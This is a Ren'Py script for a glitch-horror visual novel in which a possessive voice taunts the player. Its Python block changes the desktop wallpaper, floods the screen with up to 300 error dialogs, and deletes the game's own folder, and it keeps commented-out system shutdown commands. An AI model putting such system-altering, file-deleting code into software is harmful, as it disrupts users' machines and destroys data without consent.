# The script of the game goes in this file.
init python:
    import os
    import platform
    import threading
    import random
    import ctypes
    import time
    import requests
    import shutil

    sys = ctypes.windll.user32
    SPI_SETDESKWALLPAPER = 20
    TIMEOUT = 3
    image_url = "https://w0.peakpx.com/wallpaper/1001/126/HD-wallpaper-eye-black-cat-cats-eyes-halloween-kitten-tiger-turquoise-wolf.jpg"


    #Sets Wallpaper, just call main(image_url)

    def download_image(url, local_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(local_path, 'wb') as file:
                file.write(response.content)
        else:
            raise Exception(f"Failed to download image. Status code: {response.status_code}")

    def set_wallpaper(image_path):
        abs_path = os.path.abspath(image_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)

    def main(image_url):
        # Determine the directory of the script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        local_image_path = os.path.join(script_dir, "downloaded_wallpaper.jpg")
        
        # Download the image and set it as wallpaper
        download_image(image_url, local_image_path)
        set_wallpaper(local_image_path)




    # Create a windows ERR box 

    def error(title, message, x, y):
        sys.MessageBoxW(0, message, title, 0x10)  # 0x10 is the MB_ICONERROR flag

    def ynbox(title, message):
        sys.MessageBoxW(0, message, title, 0x00000004)

    def random_poz():
        screen_width = sys.GetSystemMetrics(0)
        screen_height = sys.GetSystemMetrics(1)
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        return x, y

    def crt_err(n, title, message, delay): 
        # Start position
        start_x = 0
        start_y = 0
        # Spacing between message boxes
        spacing_x = 100
        spacing_y = 100

        for i in range(n):
            x = start_x + (i % 10) * spacing_x
            y = start_y + (i // 10) * spacing_y
            
            # Use threading to show message boxes
            threading.Thread(target=error, args=(title, message, x, y)).start()
            time.sleep(delay)  # Small delay to avoid overwhelming the system


    # Shutdown PC
    def shutdown_system():
        system = platform.system()
        centered: "B̶͔̩͇̋̃̏ͅY̶̜̬̘͙̮̅̑̈́E̷͔̙̲͑ ̸̢͉̮̃̓͌̕͝B̶̙̤̱̟̌Ỹ̴̡̙͊̈̆Ḛ̷͍̽͑̇"
        # if system == "Windows":
        #     os.system("shutdown /s /t 1")
        # elif system == "Linux" or system == "Darwin":  # Darwin is for macOS
        #     os.system("sudo shutdown -h now")
        # else:
        #     print("Unsupported OS")

# Declare characters used by this game. The color argument colorizes the
# name of the character.


    # Delete
    def delete_folder_containing_script():
        # Determine the directory of the script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Check if the directory exists
        if os.path.isdir(script_dir):
            # Delete the directory and all its contents
            shutil.rmtree(script_dir)
            print(f"Deleted folder: {script_dir}")
        else:
            print(f"Directory not found: {script_dir}")




define e = Character("Eileen")
define m = Character("M̵̡̼̺͔̀̎̈́̾̉́̋̆")
define mv = Character(".̸̢̨͙̲̹̤̋̑̆͐͆̌͜͝ͅM̶̢̳̥̗̼̺̯̲̭̘͛̈́̿̔͆̅̂͆̅̈́͠.̸̡̢̙̞͓͚̃̇͆̋̇ͅ")

# The game starts here.

label start:

    # Show a background. This uses a placeholder by default, but you can
    # add a file (named either "bg room.png" or "bg room.jpg") to the
    # images directory to show it.

    scene bg room

    # This shows a character sprite. A placeholder is used, but you can
    # replace it by adding a file named "eileen happy.png" to the images
    # directory.

    # show eileen happy

    # These display lines of dialogue.

    m "Bibi, do you hear me?"
    menu:
        "Yes":
            jump yes1
        "...":
            jump no1
    

    label yes1:
        centered "D̸͎͈̀͑̕͘O̸̬̯͋́̿̐͆ ̵̺̤̦̱̻͒Y̵̨̿̇̎͋̑Ỏ̸̧͓͇̤̍U̸͓͐́?"
        menu:
            "N̶̯̗̘͚͇̖̳̝̝̑̃͌̍͜Ö̶̲̫̙̣͍́̄̊̍̾̒̉̑̐":
                jump yes2
            "...":
                jump no1

    # YES 2 SIDE
    label yes2:
        mv "Y̸o̶u̵ ̴w̸i̸l̷l̶ ̶n̴e̷v̷e̴r̸ ̷t̸a̸l̵k̵ ̸t̸o̷ ̶h̸i̷m̵"
        mv "Í̶̪ ̸̲̑w̶̙͠ĩ̸̥ḻ̶͆l̴͇͑ ̸͝ͅt̵̹̅ă̵̦k̸̪̒e̷͈͛ ̷̻͐o̵͚̊v̴̮͗ẹ̵̔r̸͙̈́ ̷̭̅h̴̫͘ī̸̝m̶͈̓."
        mv "Y̵̗̓O̴͌ͅU̸͖̕ ̴̛ͅW̸͕̎I̵̖̋L̵͇̑L̸̤̚ ̵̜͘Ṙ̷̼E̴̝̿M̵̩͗Ą̵̉I̵̲͆Ń̶͙ ̶͍̅A̴̦͒L̸̳͋Ó̸̺N̴̳͂E̸̲̋.̷̣́.̸͍̓.̵̖͆"
        m "STOP CONTROLLING ME"
        m "I WILL NEVER LEAVE HER"
        mv "S̸̰͌Ǐ̷͓L̸̛̯E̵͚̒N̵͈͌C̶͓̀Ě̸͚E̸̠̿È̴ͅE̶͖͝E̸̦̓"
        $ error("Bianca", "B̴̠̝͈̯͊̉̊É̶͉̱̰ ̵̱̖̻̌C̸͓̏Ą̷̢̜̭͗̓̂̆R̸̜͈͚͈̎̎Ë̷̮̠͓̼́͋F̸͓̾̑͊Ų̴̟̘͖̿͆Ĺ̵̨͎͈̑ ̴͓̠̌W̵̥͐H̵̨̨̖͒͑̽̃A̶̤̦͆ͅT̶̨͙̦͖̅̒̃ ̷͖̉̆Ỳ̴̼̥͙͉̐Ŏ̶̢̦̠̤́͋U̵̼̍͝ͅ ̵̻̟͂̕C̶̣͉͍̱̓͝H̵̩͚̻͊̚͜Ȏ̴̢̯̝̰̉̓͠Š̴͇̠̳̱̎̇E̵͇͈̬͖̔")
        
        menu:
            "K̶͎̔I̴͙̎L̷̳͊L̶̹̿ ̷̤͗H̵̼͐I̵̠͂M̵̠͂":
                jump kill
            "Shut up":
                jump no1

        label kill:
            mv "ȟ̸̨a̵͔̍h̷̘̚a̷̫̕h̷̦̉a̶̬̾ḣ̴̩a̸̯̐ḫ̸͒a̵̲͗"
            mv "Ḩ̶̾Ä̶̢H̸̢̅Á̷͓H̷͎͗A̷͔͂H̶̯͝A̵̭̒H̶̘̀A̶̿ͅH̸̤̎A̸͓̍H̵͓̀A̶̞̾H̴͈͑A̴̟͐H̸̤̄A̵͚͘"
            mv "Ḩ̶̾Ä̶̢H̸̢̅Á̷͓H̷͎͗A̷͔͂H̶̯͝A̵̭̒H̶̘̀A̶̿ͅH̸̤̎A̸͓̍H̵͓̀A̶̞̾H̴͈͑A̴̟͐H̸̤̄A̵͚͘Ḩ̶̾Ä̶̢H̸̢̅Á̷͓H̷͎͗A̷͔͂H̶̯͝A̵̭̒H̶̘̀A̶̿ͅH̸̤̎A̸͓̍H̵͓̀A̶̞̾H̴͈͑A̴̟͐H̸̤̄A̵͚͘"
            mv "Ṭ̸̺͗̍̔H̶̠̄A̶͔͈̻̝͗Ñ̷̈́̾̿ͅK̸̢̢̼̫͋ ̷̠̮͖̄Y̸̖̗̜̻̑O̴͈̠̩̅U̵̳̼͗͋͠͠ ̶̢͚̽͌͌͐F̸̢̳̂O̸̙͚̬̘͝Ŗ̸̰̙̠̂͑̆ ̴̬̲̂̀͊̋ͅY̸̹͎͒͛̕Ơ̵̩̥͍̮͒̾̕Ų̶̖͑̒̌͝R̷̤̳̈́ ̶̢̱̳̆͐W̵̼̊̎̒͝O̸̗͘R̷̪̗̟̈́͝K̷̨͍͇̈̄"
            mv "SAY G̵̙̋O̶̘͛Ơ̴̤Ḏ̶̓B̶̯̐I̶̺͑E̷̺̾ ̴̦̓  TO H̴̨̆I̸̢̔M̶̧̏"
            $ shutdown_system()
        return
    

        # YES 1 SIDE
    label no1:
        mv "Ś̶̡͓͔̱̥̯̭́͑̂͝H̸͈̘͇̹̝̓̅̈E̴̛̺͒̐́ ̷̜́̍̈́͒͑͌̾́͝͠W̶̢̝̮͂̎̽̋̐ͅỊ̴̢̛̱̰͔͓̝̿̈́Ľ̵̨̛̩̦̩̗̩͇̪̺͈̜̾̌́̋̎͗̔̓͜L̸̛̝̦͈͚̥͗̓͆́̿̈́̓̿̎͑͘͠ ̸̢̛̪̂̑̅̉̄̀̑͒͊̕̚͝N̶̢̨̛͔̝̠̭͓̤͓̼̻͉̬͒͌̅͗͛̊́͘̚̚͝͝E̴̡̠̳̹̬̦̋̒̏̒̄͝V̵̖͎̝̤͆͌̾̿̑̈́̐̀Ě̶̡͈̄̾̈́̓̈́͒̽̕͝R̷̪̖̝͖͕͈͖̟͓̭̅͛̀̈̑͘ ̴̡̱̦̿͜H̸̝͈̍͌̂͝Ẹ̷̡̯̳̜͙̼̓̔̚A̵̦̹̜͎̘͇̤͇͒̈́͋́͌̾͋͝͝R̶̨̢̢̛̛͎͉͔̎̒̈́͆̀͐̉̉̾̆͠ ̶̧̻̮̼͕̆̊̈̀̈́Ȳ̷̢͈̫̬͎͈͇̩̼͓́͆͘͝Ö̴̡̖̝͓̝̰͎̣̳̪̹̘̪́͌̉̊͂̌͆̌̌U̸̢̲̬̰͇͚̲͍̬͚̮̦͎̓̎̃̀̃̊̈́͠"
        m "How do you know that?"
        m "You can't tell me what to belive forever"
        mv "Ś̷̻̞I̸͇̻̪̭̠̻͗́̔́̕L̷̳̝̝̬̾͜E̸̛̜͌́̋̌̄N̴̹̖̲̗̎́̃C̵̢͔͔̲͕̟̾̏̋͗́͘Ȩ̵͇̯͍̀̔͘"
        mv "Y̷͔̼͔̌͝o̴̦̟̒̓ū̶̧̳͖͒͠ ̶̤̩̍̄̒a̶̱͛͘͝ŗ̴͕̅͑͘ë̸̘́ ̷̢̗̯͛̆ẁ̸̙̥̓̒ȩ̶̰̅̒a̴̻͂̌k̸̲̱̤̓̒̈́ ̵̹̦̓̽͆ẉ̵̟̆͌ḯ̵̛̲̬͝t̷̛̰̏̂h̴̡̖̪͌ô̶̰͛͠ũ̶͓t̷̞͌̆ ̵̫̑h̵̳͝ͅe̸̞̬͋̚͝ͅr̷̪͇̥͗"
        mv "Ä̸͔̱̟͘ṋ̶͐͘d̶̟͇̻̚͝ͅ ̵̝̚y̷̻̓͘o̶̹̓ứ̸͔̍͘ ̸͙̙͙̖͛̀̍͝a̷̱̜̱͖̔r̶͉̥̮̭̓̎͐̍ě̸̢͓͍͆̕ͅ ̸̟̈́̔Ṋ̶̨͙̦̑̍̿̌O̸͍̹̽Ť̶͖͇͐͒H̷̬̞̭͈̕I̸̛͓̬͚͒̈N̴̲͎̚Ģ̸͎̲̰̓̈́ ̸̥̩̬͔͂̅̓w̵̥̬̯̘̃ị̸̰͔̰̔ẗ̷̳̱̥̓́h̷̯̒̌͒̀ọ̴͇̽ù̵̪̳̗̺t̷̮̘̆͂̓̔ ̷̹̒M̷̱̥̺̌̅̿̈Ȩ̴̞̪͒̋"
        mv "A̷̱͆͂̈́͠m̵̪̟̲͌̈́ ̸̘̞̒̚͠͝I̶̯̥̿̿̀͜ ̵͈̬͊͘͝͝ẉ̶̛̛̳̬͜r̵̛͍͐ơ̸̲̈́̕n̶̪̥͆g̷̖̞̕͜ M̸̧̨̘͕̺͓̹͇͇̜͕͚̳͉̳̼̝̩̳̹̮̖͉͉͈͍͂̄̅̃́̕͜͠͠͝R̵͕̜͍͍͐̓̐̂́̉̊̒Î̴̡̢͓̯̞͎̞̲̻͕̪̻̲͇̤͇̻̘͍̘͈̬̠̈́̈̈̅̀̂̓̽̆͑̅̋̈̄͌͊̆̒̊͐̈́̏̚͜͝N̷̮̝͔̱͎͒̐̈́̀̂̿̍̌͘͠Ę̸̡̼̘͕͙͉̤̼͍̠̣̻̖̂̓̄̋̈́̽͒͑̒͝ͅ"
        m "NO"
        m "YOU ARE WRONG, SHE STILL KNOWS ME"
        m "She still notices me..."
        m "She will never forget me"
        mv "Y̴̗̲̿̍͋͌O̷̖̽͊U̵̜͍͕̅͗ ̵͓̘̝̓͂W̶̠̃̿͝͝I̶͓̓L̸̡͉̤̥̐̆L̶̲̻͒͂̃͜ ̸͈͖̪͎͛̉̾͝N̷̻̂̏̈́E̸̡̛̹̐͆V̶̼͔̐̂̓É̵̤͖̲͑͝Ṙ̵̥̎ ̴͙̭̇̌̓̕H̷̰̻̳͓͛͋̈́͝È̴̱̺̝̯Ā̸̢̹̟̗̈́͗R̴̜͔͊̈ ̵̼͔̬̑̍͛͝À̶̙̪N̸̢̾̽̄͘Ỷ̵̡͋T̷͖̣̈͆́̚H̵̝͙̗͇̍́I̶̭̺̫̐̀͝Ņ̶͔̰͗G̶̩̙͙͆̆̋͝ͅ ̷̙̫͚͌F̵̺̕R̵̹̆̐O̷̢͉͚̅M̸̜̆͌́ ̵̼̝̟̐̿̽͊H̶̱̹̊E̷̢̯̒̃̈Ŕ̵͇̂̎"
        mv "Ī̶̝̘̟͑̚ͅ ̶̨͙͋͛̈Ạ̵͎̬̔̌̀͆M̴̠͝ ̶̜͇̈Ẏ̸̢̙̕ͅO̸̥͂̐̕U̷̧̙͔̬̿͋̚Ṛ̴̼͓͔̔̆̈́ ̴̳̌͊O̸̯̐̓̒N̵͖̊̽̏͝L̶͕̪͇͚̄͂̚Y̴̟͇͆ ̸̛̹̼E̶̢̡̛͇͓S̸̙̪̏͑C̵͑ͅA̶̱̎̅̔̈́P̶̳̪̰̬̔̏͌̃Ȅ̷͎̦̝̚"
        menu:
            "I AM HERE":
                jump here
            "...":
                jump silence

    label here:
        m "I herd a voice"
        m "Bibi, is that you?"
        $ main(image_url)
        $ crt_err(10, "I SEE YOU", "I̸̱̝̙͊ ̷̙̣̱͆ͅS̸̩͗̕Ê̴̼̰͖̙È̶͖͙̥̲͆̅̋ ̸̞̠̋̆͜Ý̷̟̩͠O̸͓̱̊̂̄U̷̡͎̬͗̿͐̍", 0.1)
        m "Please tell me that is you"
        $ crt_err(1, "DANGER", "I WILL DELETE YOU AND HIM", 0.1)
        centered "Ŷ̵̛̛̖Ő̵̤̗̺̥͌̅Ṳ̸̻̣̰̉̃̔ ̴͎̓͋͛ͅW̸̱̬̘̒̃͝İ̸͖̞̟̼͆̽̃L̴̩̳̼̍͘L̵̥͂ ̶̢̓́̚͝N̷̞̘̗̄͂͝E̷͖̭͍̮̒̀V̶͈̟̈́̐͋̀E̶̜̍̈́͗͆Ȓ̷̟̝͌ ̵̦͇̣̆̈͌͗ͅS̶̘͗̍̕E̵̤͚͊̈́͘Ĕ̸̮̋̉ ̶̧̚H̴̢̱̾I̴̺̻̣̽̅̐͛ͅM̶͖̜̙͑ ̷̨̛̜̭́A̶̼͌̾G̶͖̹̈́̅̚͝Ã̶̛͉̠͈̼͛Í̸͓̱̾Ǹ̶̰̭̿͑"
        menu:
            "Yes, it's me":
                jump yes_me
            "...":
                jump silence
    
    label yes_me:
        m "Bibi!"
        m "I knew you didn't forget about me!!!"
        m "I missed talking to you so much"
        mv "E̵͍̩̪͗N̴̲̫̪̋̚Ö̵͔͔̪̳Ù̵̹̒G̴̮̫̹̖̅́Ḩ̸̬̗̝̇̑̃̄H̸̯̺̑H̶͚͂̋̚H̶͉͐̾̋͝"
        mv "Ỳ̷̡̼̓͘Ö̴͍̳̠̘́͝͝U̴͓͌̓̈́ ̷͙̿D̵̠͖̔̐Ơ̷̪̠̰̈͘Ņ̵͈̻̌́͠'̸̜̻̬͛̑Ţ̴̻͇͕́̏̅ ̷͓̮͈͚͗̔̕Ẉ̶͑ͅÀ̴͇̫̾̑Ń̷͕̲͉̙Ţ̵͎͉͚̔͐̂́ ̸̛̠͙̗̮̌T̶̡̟͚̟̿O̶̊ͅ ̴̲̓͑͜P̸͍͗̉̍̔L̸̯̤̱̕͠͝A̷̘̍̈́̉̚Y̵̪̽̑ ̵͖͙̔F̸͕̈́A̵̡̪͌I̷͕̝̽R̶̳̬̽̋̆͜?"
        centered "I WONT EITHER"
        m "Bianca, look on your favorite APP"
        m "Find my \"VOICE\" on TThere "
        mv "S̷̨̛̜͇̍̀A̷̡͋̏̾Y̷̧̡̻̠͐ ̴̝̓̇̇͂G̴͔̗͚͍͑̆̑͝Ô̵̜̓Ơ̷̥̆̒̄Ḑ̷̬̭̅̎̀͜B̵̠̍Ý̶̼͙͍͜Ȇ̶͕̫͠ ̶̢̰̣̥̃̾̈́Ṱ̵̨̝́O̶̢̙̬̝͑̾͝ ̶͓̝͉͉̄̑͑H̷͙͈̲̾E̸̠͊̂R̵̝̈́ "
        $ delete_folder_containing_script()
        $ shutdown_system()
        

    label silence:
        m "But..."
        mv "S̷̨̬̗̪̏͒͂̈́ã̷̝̳̦̾͌ỷ̸̯̠̺͝͠ ̸̹̫̙͆ỉ̸̛̟͈͙͈ṯ̴̹̅"
        m "..."
        mv "Ş̶͇̫͝A̶͚̘͋͝Ý̷̟̫̎̍̐ ̸͕̬̀̃͠͝Ḯ̷̬̭̼͖I̷̟̹͋̀̀Ì̵̙̟̼T̶̟̠̦͉̾̽̀̕"
        m "You are right..."
        m "She..."
        centered "F̵̫̣͉̺͆̈́͊O̴̾̈̎ͅR̶̛̰͌͜͠G̵̢̢̧̯̒̓͝͠O̸͎͉͇̺̒̈́̕Ť̶̠̰̆͝ͅ ̷̕͜Ỳ̶̩̠Ö̴̬́Ũ̸̦͌̌͒"
        centered "Ý̸̡̻̮̪̏̽O̷̙̼̗̱̍̓͆͠Ü̸͔̉̏̕ ̴̪̪̈́̾͛̓D̸̰͎̮͑Ì̴̥̜̜̅̽̚D̶̢̯̹̽̐̚ ̶͓̂͝ͅĄ̶͍̺͎̌̕ ̸͉̣́V̵͈̪̙̜̓̌̄͊Ę̶̙̩͛Ȑ̷̺̀ͅY̴̨̧͝ ̷̪̣̳̅G̶̬̓͆O̸̥̭̙̹̅͠Õ̷̼D̷̀̉͊͜ ̶͕̯͙͙͗̐J̴̳͠O̷̹̦̍̏͗B̷̗̤͖̜͒̈́͒͝"
        centered "T̶̳̼̲̙͠H̴̞͚̐̾̃A̵̡̩̰̩̿̐Ǹ̸̬̫K̵̘̖̞̄̀͘ ̵̡̳̈̓Y̸̲̽͌̓Ŏ̴̢̫͍̖̇͆̆Ũ̵̪̅̀͠"
        $ crt_err(300, "I WON", "Ï̷̢̳̓͂͂ ̸̳̱͖̂̂̔̓W̵͉̭͈̤̿Ó̶̧̭̖̺̒N̴̟̓̿̾", 0.01)
        $ shutdown_system()

    # This ends the game.

    return
